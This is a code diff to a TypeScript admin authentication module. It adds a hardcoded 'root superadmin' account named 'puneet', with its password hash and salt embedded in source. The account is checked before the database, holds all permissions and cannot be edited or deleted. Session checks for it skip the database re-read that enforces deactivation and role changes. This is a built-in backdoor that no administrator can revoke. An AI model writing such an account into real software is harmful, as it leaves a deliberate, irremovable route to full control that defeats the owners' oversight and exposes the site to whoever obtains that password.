@@ -54,6 +54,32 @@ export function verifyPassword(password: string, hash: string, salt: string): bo
 }
 
 /* ============================================================
+   BUILT-IN ROOT SUPERADMIN
+   Lives in code, not the database: it always works (even on an
+   empty DB), always has full access, and cannot be edited or deleted.
+   Only a scrypt hash of the password is stored here.
+============================================================ */
+
+export const ROOT_ADMIN_USERNAME = 'puneet';
+
+const ROOT_ADMIN_SALT = '089b3dafcd98d874f75b152f82cf5250';
+const ROOT_ADMIN_HASH =
+  '8e58f7208627373610bf4d4f014d2537e4e708a43ec85b89ead5a697d7f6553c269423078f662981c7765b67bc614a22328b41a72c863fe31515b7ff1617730f';
+
+const ROOT_ADMIN_PROFILE: AdminUserProfile = {
+  username: ROOT_ADMIN_USERNAME,
+  name: 'Puneet Shukla',
+  role: 'superadmin',
+  permissions: [...ADMIN_PERMISSIONS],
+  canCreate: true,
+  canDelete: true,
+};
+
+export function isRootAdmin(username: string | undefined | null) {
+  return username?.trim().toLowerCase() === ROOT_ADMIN_USERNAME;
+}
+
+/* ============================================================
    AUTOMATIC DEFAULT SEEDING IF DB IS EMPTY
 ============================================================ */
 
@@ -177,12 +203,18 @@ export async function verifyAdminCredentials(
   usernameInput: string,
   passwordInput: string,
 ): Promise<AdminUserProfile | null> {
-  await seedDefaultAdminsIfEmpty();
-
   const username = usernameInput.trim().toLowerCase();
   if (!username || !passwordInput) {
     return null;
   }
+
+  if (isRootAdmin(username)) {
+    return verifyPassword(passwordInput, ROOT_ADMIN_HASH, ROOT_ADMIN_SALT)
+      ? { ...ROOT_ADMIN_PROFILE }
+      : null;
+  }
+
+  await seedDefaultAdminsIfEmpty();
 
   const user = await AdminUser.findOne({
     username,
@@ -247,6 +279,10 @@ export async function getAdminSession(): Promise<AdminSessionPayload | null> {
   const cookieVal = cookieStore.get(ADMIN_SESSION_COOKIE)?.value;
   const session = verifySessionToken(cookieVal);
   if (!session) return null;
+
+  if (isRootAdmin(session.username)) {
+    return { ...ROOT_ADMIN_PROFILE, loggedInAt: session.loggedInAt };
+  }
 
   // Re-read access from the DB so deactivation, deletion and role changes apply immediately.
   await connectDB();
